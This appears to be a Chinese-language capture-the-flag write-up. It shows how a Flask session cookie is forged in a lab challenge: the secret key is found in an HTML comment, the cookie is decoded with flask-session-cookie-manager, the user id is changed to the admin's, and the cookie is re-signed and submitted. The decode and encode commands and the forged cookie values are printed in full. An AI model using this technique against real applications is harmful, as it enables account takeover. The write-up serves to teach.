## [NSSRound#13 Basic]flask?jwt?

> Flask
>
> 第一次遇到这种题，构造session

1. 进入页面发现需要登录，尝试一下登录不进去，我们就注册一个账号，登录进入另一个界面

   ![image-20240821153816950](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240821153816950.png)

   点击拿flag，得到我不是admin的提示

2. 分析一下cookie内容，结合题目发现是session构造

3. 查了资料，下载脚本：https://github.com/noraj/flask-session-cookie-manager

4. 在忘记密码页面,得到：secretkey

```
<!-- secretkey: th3f1askisfunny -->
```

5. 解码

```
python flask_session_cookie_manager3.py decode -s “th3f1askisfunny” -c “.eJwljjkOwzAMwP6iuYPs6LDzmUCyJbRr0kxF_14DBVcS4AeOPON6wv4-73jA8Zqwg1NULhlNhAubKBtLOCc6U0fCqQONCZe3bVRJk2YzbZUGzRoi5L2kF-IM7Gk0o2uiVhZNaSV0uBfpNGnTYbZ6xtIXiSgT1sh9xfm_qfD9AV9VLiU.ZsWZAw.serOtgnY1BhZSNuOx3aYEYkg34Y”

#结果
{'_fresh': True, '_id': 'b4e251fe866515a675a56eb5f0b549040d7c0a5404e2334247f4d8a7824c4d2e664b91fb145fe09fa4de97f072567f681e7cbb1694d437caa7f45019191f006d', '_user_id': '2'}
```

6. 编码

```
#待编码内容
{'_fresh': True, '_id': 'b4e251fe866515a675a56eb5f0b549040d7c0a5404e2334247f4d8a7824c4d2e664b91fb145fe09fa4de97f072567f681e7cbb1694d437caa7f45019191f006d', '_user_id': '1'}

#编码结果：
.eJwljjkOwzAMwP6iuYPk6LDzmUC2JbRr0kxF_14DBVcS4AeOPON6wv4-73jA8ZqwQ-coQhlVVUhcTVw0uiR24YaM0wa6MC5v27iwJc_qVgsPniVUuTfKTiwZ2NJ5RrNEK6KWWils9E7aePJmw331gtQWiagT1sh9xfm_Ifj-AF9SLiQ.ZsWaSQ.YVMvNUkro2QI49RcVyr_VOoQIdw
```

提交到cookie，点击按钮拿到flag

